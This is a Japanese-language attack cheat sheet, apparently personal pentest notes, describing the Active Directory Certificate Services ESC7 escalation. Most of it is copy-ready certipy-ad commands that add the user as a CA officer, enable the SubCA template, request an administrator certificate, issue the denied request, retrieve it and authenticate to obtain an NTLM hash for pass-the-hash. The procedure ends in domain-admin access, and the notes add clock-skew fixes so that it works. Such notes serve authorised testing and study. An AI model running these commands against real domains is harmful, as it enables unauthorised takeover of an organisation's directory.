# ESC7

ADCS ESC7 攻撃は、`ManageCA`アクセス権と `Manage Certificates` アクセス権の組み合わせを悪用する。この攻撃では、ManageCAアクセス権を持つ攻撃者は、自分自身を新しい担当者として追加し、自分自身にManage Certificatesアクセス権を付与することできる

その後、下位認証局 `SubCA` 証明書テンプレートを使用して証明書を要求できる。この要求は最初は拒否されるが、高い権限を持つ攻撃者は、以前に拒否された証明書要求を発行できる。これにより、権限を昇格し、ドメイン管理者としてアクセスできるようになる

## 前提条件 – ESC7 攻撃

ESC7攻撃を行うには、次の要件を満たす必要がある

- `ManageCA` 権限

- `Manage Certificates` 権限

  `ManageCA` アクセス権があれば、自分自身に `Manage Certificates` アクセス権を付与することができる。これは、ユーザーアカウントを新しい役員として追加することで実行できる

  ```
  certipy-ad ca -u <USERNAME>@<DOMAIN> -p "<PASSWORD>" -dc-ip <DC_IP> -ca <CA_NAME> -add-officer <USERNAME>
  ```

- 証明書テンプレートSubCA を有効にする
  - 証明機関 (CA) の管理**および**証明書の管理アクセス権を持つユーザーは、失敗した証明書要求を発行できる
  - SubCA 証明書テンプレートは ESC1 に対して脆弱だが、テンプレートに登録できるのは管理者のみ
  - ユーザーはSubCA に証明書を要求できる。この要求は最初は拒否されるが、マネージャーが承認して証明書を発行することができる

すべてのtamplateを表示する

```
certipy-ad ca -u <USERNAME>@<DOMAIN> -p "<PASSWORD>" -dc-ip <DC_IP> -ca <CA_NAME> -list-templates
```

証明書テンプレートSubCA を有効にする

```
certipy-ad ca -u <USERNAME>@<DOMAIN> -p "<PASSWORD>" -dc-ip <DC_IP> -ca "<CA_NAME>" -enable-template SubCA
```

## 証明書を要求する

### SubCA テンプレートを使用して証明書を要求する

```
certipy-ad req -u <USERNAME>@<DOMAIN> -p "<PASSWORD>" -ca <CA_NAME> -target <DC_IP> -template SubCA -upn administrator@<DOMAIN>
```

### 失敗した証明書要求を発行する

```
# 以前に拒否されたリクエストIDを指定する
certipy-ad req -u <USERNAME>@<DOMAIN> -p "<PASSWORD>" -ca <CA_NAME> -issue-request <id>
```

### 発行された証明書を取得する

```
certipy-ad req -u <USERNAME>@<DOMAIN> -p "<PASSWORD>" -ca <CA_NAME> -target <DC_IP> -retrieve <id>
```

### 証明書を使用して認証する

```
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>
```

NTLMハッシュを取得すると Pass-The-Hash攻撃でDCにアクセスできる

[Pass-The-Hash]()



## 証明書取得の際にエラーが出るとき

攻撃端末と攻撃対象のサーバーの時間が同期されていないと `[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)` というエラーが出て、失敗するので攻撃対象のサーバーの時間を同期する必要がある。

以下のコマンドでDNSサーバ―と時間を同期させる

```
sudo ntpdate -n <DNS_IP>
```

これでもうまくいかない場合、ネットワークタイムプロトコルの自動更新を無効にする

```
timedatectl set-ntp off
```

その後、時間をもう一度同期させるとできるはず

